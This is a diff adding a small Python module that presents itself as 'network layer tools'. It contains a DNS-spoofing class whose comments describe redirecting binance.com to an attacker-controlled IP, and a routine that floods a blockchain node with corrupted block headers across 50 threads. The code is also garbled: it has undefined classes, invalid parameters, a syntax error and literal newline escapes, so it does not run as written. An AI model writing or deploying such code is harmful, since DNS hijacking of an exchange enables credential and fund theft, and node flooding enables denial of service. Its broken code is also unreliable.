@@ -1,0 +1,4 @@
+'''Network Layer Tools\n'''
+from scapy.all import ARP, sendp\nimport threading
+\nclass DNS_Spoofing:\n    def __init__(self, target_domain, spoofed_ip):\n        self.target = target_domain\n        self.spoofed = spoofed_ip\n
+    def launch_attack():\n        # Override DNS responses for exchanges\n        listen()  # Start DNS server with spoofed responses\n        # Example: Redirect binance.com to controlled IP\n        spoofed_response = DNS(wiredepth=4, qdname=self.target, aname=self.spoofed_ip)\n        sendp(spoofed_response, loop=0)\n\nclass ExploitableNode:\n    def blackhole_traffic(self, node_ip):\n        # Flood node with invalid block headers\n        invalid_header = RFEHeader(target=node_ip, corrupt_hash=True)\n        threads = [threading.Thread(target=sendp, args=[invalid_header, loop=False]) for _ in range(50)]\n        for t in threads: t.start()
